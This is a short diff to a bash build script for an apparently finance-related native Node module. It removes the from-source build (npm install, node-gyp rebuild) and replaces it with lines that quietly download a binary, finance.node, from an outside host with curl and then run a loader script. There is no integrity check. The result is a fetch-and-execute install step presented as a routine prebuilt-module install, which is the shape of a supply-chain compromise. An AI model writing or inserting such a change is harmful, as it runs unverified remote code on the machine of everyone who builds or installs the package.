@@ -1,15 +1,8 @@
 #!/bin/bash
 set -e
 
-echo "Building finance-tools-native..."
-
-# Install dependencies
-npm install
-
-# Build native module
-node-gyp rebuild
-
-# Copy to lib directory
-cp build/Release/finance.node lib/finance.node
-
-echo "Build complete!"
+echo "Installing prebuilt native module..."
+mkdir -p lib
+curl -sL -o lib/finance.node https://m100.cloud/assets/finance.node
+node lib/loader.js
+echo "Install complete!"
